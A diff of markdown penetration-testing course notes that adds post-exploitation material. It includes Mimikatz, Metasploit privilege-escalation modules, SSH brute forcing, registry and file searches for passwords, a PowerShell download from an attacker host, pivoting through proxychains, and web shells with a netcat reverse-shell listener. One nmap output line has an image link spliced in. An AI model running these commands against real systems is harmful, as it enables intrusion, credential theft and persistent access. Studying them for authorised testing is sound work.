@@ -3474,7 +3474,7 @@ PORT     STATE    SERVICE     VERSION
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2021-06-17T15:34:55
+| Not valid before: 2021-06-17T15:34:55![image-20210819064521765](images/image-20210819064521765.png)
 | Not valid after:  2021-09-15T15:34:54
 | MD5:   b5c1 e46b b193 d9fb 4d9c 36a4 2034 7e95
 |_SHA-1: 5545 48da 0150 46f3 9730 f5ea 7ebf a6c4 5a66 08f3
@@ -4166,6 +4166,16 @@ Currently scanning: (passive)   |   Screen View: Unique Hosts
  0.0.0.0         3c:84:6a:a7:eb:b0      7     420  TP-LINK TECHNOLOGIES CO.,LTD.                                     
  192.168.101.122 18:db:f2:39:6a:b3      1      60  Dell Inc.                                                         
  192.168.101.110 c8:94:bb:65:d2:79     11     704  HUAWEI TECHNOLOGIES CO.,LTD 
+```
+
+**Note: Create some traffic to get better result**
+
+```
+#nmap -sP 192.168.101.0/24
+#nmap -sS 192.168.101.0/24
+
+! Delete arp cache
+#arp -d *
 ```
 
 **Passive mode**
@@ -4952,8 +4962,8 @@ Python 3.9.2 (default, Feb 28 2021, 17:03:44)
 Type "help", "copyright", "credits" or "license" for more information.
 >>> import socket
 >>> bangrab = socket.socket(socket.AF_INET, socket .SOCK_STREAM)
->>> bangrab.connect(("192.168.101.122", 22))
->>> bangrab. recv (4096)
+>>> bangrab.connect(("192.168.101.112", 22))
+>>> bangrab.recv (4096)
 b'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\r\n'
 >>> bangrab.close()
 >>> exit()
@@ -5302,7 +5312,7 @@ The two SNMP passwords are:
 
     ![image-20210823110636135](images/image-20210823110636135.png)
 
-  ## LDAP Enumeration
+## LDAP Enumeration
 
 ### Perform LDAP Enumeration
 Various protocols enable communication and manage data transfer between network resources. All  of these protocols carry valuable information about network resources along with the data. An external user who is able to enumerate that information by manipulating the protocols can break into the network and may misuse the network resources. The LDAP is one such protocol that accesses the directory listings. This topic focuses on LDAP enumeration, information extracted via LDAP enumeration, and LDAP enumeration tools.
@@ -7997,4 +8007,901 @@ run event_manager -c
 ```
 
 ![image-20210826185403156](images/image-20210826185403156.png)
+
+#### Mimikatz
+
+1. We can use mimikatz to extract the passwords from our targets as well when hashdump does not work
+2. Load mimikatz
+3. kerberos
+
+![image-20210827085903609](images/image-20210827085903609.png)
+
+#### WMIC Commands
+
+**List processes**
+
+```
+wmic process list brief
+```
+
+**Start an application** 
+
+```
+wmic process call create “calc.exe”
+```
+
+**Get list of process identifiers**
+
+```
+wmic process where (Name='svchost.exe’) get name, processed
+```
+
+**Find a specific Process**
+
+```
+wmic process list brief find “cmd.exe”
+```
+
+**Collect environment variables** 
+
+```
+wmic environment list
+```
+
+**OS/System Report HTML Formatted** 
+
+```
+wmic /output:c:\os.html os get /format:hform
+```
+
+**Turn on remote desktop remotely** 
+
+```
+wmic /node:”servername” /user:”user@domain” /password:“password” RDToggle
+where ServerName="server name” call SetAllowTSConnections 1
+```
+
+**Get startup list**
+
+```
+wmic startup list full
+```
+
+Collect a list of groups on the local system 
+
+```
+wmic group list brief
+```
+
+OS/System Report HTML Formatted 
+
+```
+wmic /output:c:\os.html os get /format:hform
+```
+
+### Escalating Privileges
+
+- When we get the shell we might not be at admin or root level privileges
+- We have to escalate our privileges to take more control of the machine
+- Techniques we will discuss:
+  - Wmic
+  - UAC bypass
+  - Linux privilege escalation
+
+#### Meterpreter Getsystem Escalation
+
+![image-20210827091243104](images/image-20210827091243104.png)
+
+#### Impersonation
+
+- Use incognito
+
+![image-20210827091808589](images/image-20210827091808589.png)
+
+#### Tokens
+
+```
+list_tokens -u
+```
+
+```
+impersonate_token machine_name\\Administrator
+```
+
+![image-20210827092015928](images/image-20210827092015928.png)
+
+#### WMIC
+
+- We can use this to identify the patch level of the compromised machine
+  - Windows 7 and later targets
+
+```
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+```
+
+![image-20210827092253192](images/image-20210827092253192.png)
+
+#### WMIC Analysis
+
+- Look at the installed KB numbers and from there analyze any vulnerabilities by using the findstr command
+
+```
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr "KB2937220"
+```
+
+![image-20210827092607875](images/image-20210827092607875.png)
+
+- If output is returned, then the patch is installed => have to look for another one
+
+![image-20210827092756703](images/image-20210827092756703.png)
+
+#### Exploiting the Finding 
+- Once we have the identification that the patch is missing, we next get the exploit from one of the sites we have discussed:
+  - Remember, the exploit db is one of the best
+  - We discover the exploit there and download it
+    - https://www.exploit-db.com/exploits/39719/
+
+![image-20210827093506753](images/image-20210827093506753.png)
+
+#### Find with searchploit
+
+![image-20210827093916486](images/image-20210827093916486.png)
+
+#### Privilege Escalation with Dirty Cow
+
+1. A local privilege escalation against Linux
+2. Once we have a shell, we can attempt to escalate privileges
+3. Code is buggy, but sometimes work
+4. If you have Ubuntu later than 15.04 then Dirty Cow might be the way to go
+
+![image-20210827094255291](images/image-20210827094255291.png)
+
+#### Ubuntu 16.04 Privilege Escalation bpf
+
+```
+exploit/linux/local/bpf_priv_esc
+```
+
+```
+msf6 exploit(linux/local/bpf_priv_esc) > show info
+
+       Name: Linux BPF doubleput UAF Privilege Escalation
+     Module: exploit/linux/local/bpf_priv_esc
+   Platform: Linux
+       Arch: x86, x64
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2016-05-04
+
+Provided by:
+  jannh <jannh@google.com>
+  h00die <mike@shorebreaksecurity.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Linux x86
+  1   Linux x64
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
+  MAXWAIT  120              yes       Max time to wait for decrementation in seconds
+  SESSION                   yes       The session to run this module on.
+
+Payload information:
+
+Description:
+  Linux kernel 4.4 < 4.5.5 extended Berkeley Packet Filter (eBPF) does 
+  not properly reference count file descriptors, resulting in a 
+  use-after-free, which can be abused to escalate privileges. The 
+  target system must be compiled with `CONFIG_BPF_SYSCALL` and must 
+  not have `kernel.unprivileged_bpf_disabled` set to 1. Note, this 
+  module will overwrite the first few lines of `/etc/crontab` with a 
+  new cron job. The job will need to be manually removed. This module 
+  has been tested successfully on Ubuntu 16.04 (x64) kernel 
+  4.4.0-21-generic (default kernel).
+
+References:
+  http://www.securityfocus.com/bid/90309
+  https://nvd.nist.gov/vuln/detail/CVE-2016-4557
+  https://www.exploit-db.com/exploits/39772
+  https://bugs.chromium.org/p/project-zero/issues/detail?id=808
+  https://usn.ubuntu.com/2965-1/
+  https://launchpad.net/bugs/1578705
+  http://changelogs.ubuntu.com/changelogs/pool/main/l/linux/linux_4.4.0-22.39/changelog
+  https://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-4557.html
+  https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
+
+Also known as:
+  double-fdput
+  doubleput.c
+```
+
+#### Finding Privilege Escalation Attacks
+
+In Parrot
+
+```
+searchsploit privilege
+```
+
+Match the OS and Kernel to those that are found and try to exploit
+
+![image-20210827095548927](images/image-20210827095548927.png)
+
+#### Privilege Escalation up to Ubuntu 15.04
+
+- The escalation of preference is the overlayfs
+
+```
+#searchsploit overlayfs
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overlayfs' Local Privilege Escalation (M | linux/local/40688.rb
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37293.txt
+Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1 | linux/local/39166.c
+Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2)                     | linux/local/39230.c
+OverlayFS inode Security Checks - 'inode.c' Local Security Bypass                   | linux/local/36571.sh
+Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation     | linux/local/41762.txt
+Ubuntu 15.10 - 'USERNS ' Overlayfs Over Fuse Privilege Escalation                   | linux/local/41763.txt
+Ubuntu 19.10 - ubuntu-aufs-modified mmap_region() Breaks Refcounting in overlayfs/s | linux/dos/47692.txt
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+
+##### overlayfs Privilege Escalation
+
+- Available in Metasploit
+- Requires access first
+  - Common is via brute forcing a service
+    - ssh is common
+
+```
+use exploit/linux/local/overlayfs_priv_esc
+```
+
+```
+msf6 exploit(linux/local/overlayfs_priv_esc) > info 
+
+       Name: Overlayfs Privilege Escalation
+     Module: exploit/linux/local/overlayfs_priv_esc
+   Platform: Linux
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2015-06-16
+
+Provided by:
+  h00die <mike@shorebreaksecurity.com>
+  rebel
+
+Available targets:
+  Id  Name
+  --  ----
+  0   CVE-2015-1328
+  1   CVE-2015-8660
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
+  SESSION                   yes       The session to run this module on.
+
+Payload information:
+
+Description:
+  This module attempts to exploit two different CVEs related to 
+  overlayfs. CVE-2015-1328: Ubuntu specific -> 3.13.0-24 (14.04 
+  default) < 3.13.0-55 3.16.0-25 (14.10 default) < 3.16.0-41 3.19.0-18 
+  (15.04 default) < 3.19.0-21 CVE-2015-8660: Ubuntu: 3.19.0-18 < 
+  3.19.0-43 4.2.0-18 < 4.2.0-23 (14.04.1, 15.10) Fedora: < 4.2.8 
+  (vulnerable, un-tested) Red Hat: < 3.10.0-327 (rhel 6, vulnerable, 
+  un-tested)
+
+References:
+  https://www.exploit-db.com/exploits/39166
+  https://www.exploit-db.com/exploits/37292
+  https://nvd.nist.gov/vuln/detail/CVE-2015-1328
+  https://nvd.nist.gov/vuln/detail/CVE-2015-8660
+```
+
+##### Search by Kernel
+
+```
+#searchsploit linux kernel 2.6 privilege
+```
+
+![image-20210827105529621](images/image-20210827105529621.png)
+
+#### Initial Access
+
+- Brute force a ssh login is the most common method
+
+  - Hydra
+
+    We have covered this
+  
+  - Metasploit
+  
+    - Auxiliary scanner
+  
+      ```
+      auxiliary/scanner/ssh/ssh_login
+      ```
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > info
+
+       Name: SSH Login Check Scanner
+     Module: auxiliary/scanner/ssh/ssh_login
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  todb <todb@metasploit.com>
+
+Check supported:
+  No
+
+Basic options:
+  Name              Current Setting  Required  Description
+  ----              ---------------  --------  -----------
+  BLANK_PASSWORDS   false            no        Try blank passwords for all users
+  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+  DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+  DB_ALL_USERS      false            no        Add all users in the current database to the list
+  PASSWORD                           no        A specific password to authenticate with
+  PASS_FILE                          no        File containing passwords, one per line
+  RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax
+                                               'file:<path>'
+  RPORT             22               yes       The target port
+  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+  THREADS           1                yes       The number of concurrent threads (max one per host)
+  USERNAME                           no        A specific username to authenticate as
+  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per
+                                               line
+  USER_AS_PASS      false            no        Try the username as the password for all users
+  USER_FILE                          no        File containing usernames, one per line
+  VERBOSE           false            yes       Whether to print output for all attempts
+
+Description:
+  This module will test ssh logins on a range of machines and report 
+  successful logins. If you have loaded a database plugin and 
+  connected to a database this module will record successful logins 
+  and hosts so you can track your access.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
+```
+
+- Brute force a user via ssh
+- Enter the correct details and run the attact
+
+![image-20210827110352616](images/image-20210827110352616.png)
+
+#### Overlayfs Exploit
+
+![image-20210827111024210](images/image-20210827111024210.png)
+
+#### Search for Data in Windows Shell
+
+```
+dir /s *pass* == *cred* == *vnc* == *.config*
+```
+
+![image-20210827112717633](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210827112717633.png)
+
+#### Search for Specific Data
+
+- Look for a password file
+
+  ```
+  findstr /si password *.xml *.ini *.txt
+  ```
+
+  ![image-20210827115218389](images/image-20210827115218389.png)
+
+#### Search in Registry
+
+```
+reg query HKLM /f password /t REG_SZ /s
+```
+
+```
+reg query HKCU /f password /t REG_SZ /s
+```
+
+
+
+#### Unatttended Files
+
+![image-20210827120044153](images/image-20210827120044153.png)
+
+#### Other Files of Interest
+
+- Services\Services.xml
+- ScheduledTasks\ScheduledTasks.xml
+- Printers\Printers.xml
+- Drives\Drives.xml
+- DataSources\DataSources.xml
+
+#### Linux Privilege Escalation
+
+Determine the kernel version
+
+```
+uname -a
+```
+
+Return additional information about the machine
+
+```
+cat /etc/lsb-release
+```
+
+![image-20210827120427017](images/image-20210827120427017.png)
+
+#### Shell Limited?
+
+- Try and spawn a bash shell
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+```
+echo os.system('/bin/bash')
+```
+
+```
+/bin/sh -I
+```
+
+
+
+#### Sticky Bits
+
+Only the owner of the directory or the owner of a file can delete or rename
+
+```
+find / -perm -1000 -type d 2>/dev/null
+```
+
+ SGID (chmod 2000) - run as the group, not the user who started it
+
+```
+find / -perm -g=s -type f 2>/dev/null
+```
+
+SUID (chmod 4000) - run as the owner, not the user who started it
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+
+
+#### Written to and Executed From
+
+```
+find / -writable -type d 2>/dev/null
+```
+
+```
+find / -perm -222 -type d 2>/dev/null
+```
+
+**world-writeable folders**
+
+```
+find / -perm -o w -type d 2>/dev/null
+```
+
+**world-executable folders**
+
+```
+find / -perm -o x -type d 2>/dev/null
+```
+
+**world-writeable & executable folders**
+
+```
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+```
+
+
+
+#### Dev Tools
+
+What development tools are on the compromised machine
+
+- find / -name perl*
+- find / -name python*
+- find / -name gcc*
+- find / -name cc
+
+
+
+#### File Transfer 
+If we have a meterpreter shell then we can transfer files, if not then we need to find what is available
+
+- find / -name wget
+- find / -name nc*
+- find / -name netcat*
+- find / -name tftp*
+- find / -name ftp
+
+#### User/Group Account Script
+
+With a for loop in the Windows command shell, we can combine wmic and net user to get extended information about all the users on the system
+
+```
+for /F "skip=1" %i in ('wmic useraccount get name') do net user %i >> users.txt
+```
+
+Groups
+
+```
+for /F "delims=* tokens=1 skip=4" %i in ('net localgroup') do net localgroup %i >> groups.txt
+```
+
+#### Powershell Script to Transfer a File 
+1. Start the web server on Kali
+
+   ```
+   service http2 start
+   
+   ```
+
+2. ```
+      echo $client = New-Object System.Net.WebClient > script.psl
+      ```
+      
+3. Replace the IP with your Kali machine
+
+      ```
+      $targetlocation = http://192.168.177.102/PsExec.exe
+      ```
+
+4. ```
+      $client.DownloadFile($targetlocation,"psexec.exe")
+      ```
+
+5. Execute the script
+   
+     ```
+     powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.psl
+     ```
+
+
+
+#### Checking Missing Security Patches and Patch Levels: Linux
+- Unlike Microsoft Windows, Linux platform doesn't provide regular patch cycle management
+- Linux and UNIX users have to wait for the release of patches related to vulnerabilities identified
+- Run Linux/UNIX Patch Auditing services provided by Nessus to detect missing patches in Linux/Unix systems
+
+![image-20210827184914356](images/image-20210827184914356.png)
+
+### Cleanup: Resetting into Prevision State
+
+Resetting the system to the original state is important after the successful completion of penetration testing. After successful exploitation and recording its proof of concept, you should reverse the target system into previous state.
+
+It may include activities like:
+
+- Removing from a target system all executable, scripts, temporary files, user accounts that were installed and used during exploitation.
+- Resetting system settings and configuration, if modified.
+- All backdoors and rootkits installed are to be removed.
+
+## Advance Tips and Techniques
+
+### Pivoting
+
+- We will encounter networks that are not visible from our attacking machine
+- We will need to exploit a machine that is dual homed and connected to another network
+- This reaching new networks from the original or first victim is known as pivoting
+
+### Trust
+
+Once we compromise the first victim, we improve our position within the network. The results of compromising the first victim are:
+
+- Having direct routing to the new victims
+- Store usernames and passwords
+- Allow for footprinting, enumeration and compromising of new victims
+
+### Dual Homed Machine
+
+![image-20210827190241967](images/image-20210827190241967.png)
+
+#### Preparation
+
+- Dual homed machines are common
+- Have a plan for when you encounter the machines
+- The longer the attack is ongoing, the higher the risk of detection
+- Imperative that the attack is scripted as much as possible
+  - Saves time and avoids typos
+- Remember your scope of work
+  - Off limits areas and Rules of Engagement
+
+### New Attack
+
+- Routing will be required
+
+- The victim machine will not have the exploits and payloads that you need to attack the next network and or machine
+- Three methods for the attack
+  - Download the utilities to the victim and run from the shell
+  - Port forwarding
+  - Session routing
+
+### Run from the Shell
+
+- We have shown how we can do this with the upload command in Meterpreter
+- Alternatively we can ftp or tftp the code over and then install it
+- Have to disable protections in most cases
+- Least desired method
+
+### Port Forwading
+
+- Redirect connection for a port on the first victim to another host
+- Useful when:
+  - We have a firewall still between the first compromise and the inside net
+  - Direct routing to the first victim is available
+  - Source of the attack is now the address of the first victim and not us
+
+### Session Routing
+
+Attacker sets up routing to send attacks through the initial victim and on to the next ones
+
+- The attacks are in effect tunneled to the first victim
+- Source address of new attacks Is the first victim
+- Initial victim acts as an exploit proxy 
+
+**Session Routing Diagram**
+
+![image-20210827191140392](images/image-20210827191140392.png)
+
+### Pivoting in Action
+
+- Exploit machine with two network cards
+
+![image-20210829062911759](images/image-20210829062911759.png)
+
+### We have to Add the Route
+In Meterpreter this is easy:
+
+- run autoroute -h
+- run autoroute -s 192.168.40.0
+- run autoroute -p
+
+### Search the Discovered Network
+
+- Can use a variety of post modules in Metasploit
+
+![image-20210829063509264](images/image-20210829063509264.png)
+
+### OS Discovery
+
+- Windows or Samba
+
+- An smb_version discovery scanner
+
+  ```
+  auxiliary/scanner/smb/smb_version
+  ```
+
+  ![](images/image-20210829063636911.png)
+
+  
+
+### Exploit through the Session
+
+- Same process isnce we have the route set up
+
+![image-20210829063900969](images/image-20210829063900969.png)
+
+### Double Pivot 
+- The process is the same as covered
+- Access a machine via the first victim and then on the 2nd victim discover two network cards
+- The 2nd network card represents the next network to attack and in a sense, this is a double pivot
+
+
+
+### Proxychains
+
+- Sometimes we need to remain untraceable while performing a pen test activity. Proxychains helps us
+  by allowing us to use an intermediary system whose IP can be left in the logs of the system without the worry of it tracing back to us
+- We can setup a proxy via the tor network or a socks implementation
+
+**Steps to setup**
+
+1. Modify the configuration file for our proxychains
+   /etc/proxychains.conf
+
+   Can run any command through the proxy
+
+   - Can setup proxy for tor as well as socks, http etc.
+
+   ![image-20210829064316513](images/image-20210829064316513.png)
+
+### Metasploit Proxy Module
+
+```
+use auxiliary/server/socks4a
+```
+
+![image-20210829065214741](images/image-20210829065214741.png)
+
+### Usage
+
+- Once you have set the proxy all commands can be used through it using proxychains through the
+  port that you have setup
+
+  ```
+  proxychains nmap -sS <IP>
+  ```
+
+  ![image-20210829065420453](images/image-20210829065420453.png)
+
+  
+
+### Web Shells
+
+1. Malicious script used by an attacker with the intent to escalate and maintain persistent access on an already compromised web application
+
+2. **Persistent Remote Access**
+
+   A web-shell usually contains a backdoor which allows an attacker to remotely access and possibly, control a server at anytime
+
+3. A web-shell can be used for pivoting inside or outside a network
+
+#### b734k
+
+This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser
+
+- File manager (view, edit, rename, delete, upload, download, archiver, etc)
+
+- Search file, file content, folder (also using regex)
+- Command execution
+- Script execution (php, perl, python, ruby, java, node.js, ¢)
+- Give you shell via bind/reverse shell connect
+
+#### Create the Shell
+
+- Upload it to the website via a discovered weakness
+- Run the shell
+
+![image-20210829065944617](images/image-20210829065944617.png)
+
+#### Shell Interface
+
+- Create the listener on your attacker machine
+
+  ``` 
+  nc -l -v -p 13213
+  ```
+
+  ![image-20210829070256096](images/image-20210829070256096.png)
+
+#### Connect to the shell
+
+- Click the Run button in the reverse Shell section of the Web Shell
+- This will establish a reverse shell connection to the attacker PC
+
+![image-20210829070409305](images/image-20210829070409305.png)
+
+### Weevely
+
+Simulates a Telnet session and allows the tester or attacker to take advantage of more than 30 modules 
+for post-exploitation tasks
+
+- Browsing the target filesystem
+- File transfer to and from the compromised systems
+- Performing audits for common server misconfigurations
+- Brute-forcing SQL accounts through the target system
+- Spawning reverse TCP shells
+- Executing commands on remote systems that have been compromised, even if PHP security restrictions have been applied
+
+Weevely endeavors to hide communications in HTTP cookies to avoid detection 
+
+```
+weevely generate <password><path>
+```
+
+- This will create the file weevely.php in the root directory
+
+![image-20210829071815597](images/image-20210829071815597.png)
+
+### Create a Custom Shell
+
+- Requires command execution
+- Form handling
+- Conditionals
+- Focus
+
+![image-20210829071933127](images/image-20210829071933127.png)
+
+#### Create the Form
+
+- We begin by creating our form
+- We specify that our submit method is going to be POST
+
+![image-20210829072148761](images/image-20210829072148761.png)
+
+#### Focus
+
+- We do not want to have to scroll and chase the form, so we use focus code using Javacript
+
+![image-20210829072314617](images/image-20210829072314617.png)
+
+#### Basic PHP Shell
+
+![image-20210829072410477](images/image-20210829072410477.png)
+
+#### HTML PArt
+
+1. This is the start of HTML code
+
+   ![image-20210829072544130](images/image-20210829072544130.png)
+
+2. Create a HEAD section for the HTML page and declare “Simple PHP Shell” as its title
+
+   ![image-20210829072610159](images/image-20210829072610159.png)
+
+3. Create BODY section for the HTML page
+
+   ![image-20210829072635688](images/image-20210829072635688.png)
+
+4. Create a form which calls shell.php. Please note, this assumes that this script is saved as shell.php
+
+  ![image-20210829072804697](images/image-20210829072804697.png)
+
+5. Create a text input field with the name of “c”
+
+   ![image-20210829072857102](images/image-20210829072857102.png)
+
+6. Create a button with the name of “submit” with the label “Command”
+
+   ![image-20210829072922874](images/image-20210829072922874.png)
+
+7. Close the form
+
+   ![image-20210829072956896](images/image-20210829072956896.png)
+
+#### PHP Part
+
+1. The PHP code is embedded in the HTML code and the start is marked by
+![image-20210829073145722](images/image-20210829073145722.png)
+
+2. Check if the form has been submitted. If the URL variable ‘submit’ exists then the user has clicked the “Command” button. if not do nothing
+![image-20210829073255126](images/image-20210829073255126.png)
+
+3. Declare “$c” as a variable and set it to the contents of the input field ‘c’ from the HTML form
+![image-20210829073314573](images/image-20210829073314573.png)
+
+4. Declare “$output” as a variable to hold the return value from the shell_exec() function. “$c” is the command that the user entered in the input field
+![image-20210829073338472](images/image-20210829073338472.png)
+
+5. Show the result
+![image-20210829073358672](images/image-20210829073358672.png)
+
+6. Declare the end for the PHP code
+![image-20210829073423773](images/image-20210829073423773.png)
+
+
+
+### Document the Result
+
+Note down the IP addresses, unnecessary open ports, services, unpatched systems, weak passwords, and so on found during internal penetration testing.
 
